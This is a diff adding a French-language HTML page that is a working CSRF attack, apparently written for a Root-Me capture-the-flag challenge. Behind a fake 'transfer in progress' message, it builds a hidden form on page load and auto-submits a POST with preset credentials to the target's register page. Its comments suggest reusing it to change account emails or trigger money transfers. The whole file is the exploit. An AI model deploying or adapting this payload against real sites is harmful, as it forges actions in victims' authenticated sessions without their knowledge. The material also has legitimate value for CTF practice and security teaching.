@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Chargement...</title>
+</head>
+<body>
+    <p>Transfert en cours, veuillez patienter...</p>
+
+    <script>
+        function executeCSRF() {
+            // 1. Création dynamique d'un formulaire invisible
+            const form = document.createElement('form');
+            form.method = 'POST';
+            
+            // L'URL de l'action vulnérable sur le site cible
+            form.action = 'http://challenge01.root-me.org/realiste/ch16/?page=register.php';
+            form.style.display = 'none';
+
+            // 2. Ajout des paramètres (les champs du formulaire)
+            // Exemple : changer l'email du compte ou déclencher un virement
+            const payload = {
+                'username': 'nokk',
+                'passwor': 'nokk',
+            };
+
+            for (const key in payload) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = payload[key];
+                form.appendChild(input);
+            }
+
+            // 3. Injection dans la page et soumission
+            document.body.appendChild(form);
+            form.submit();
+        }
+
+        // Exécution dès que le DOM est prêt
+        window.onload = executeCSRF;
+    </script>
+</body>
+</html>
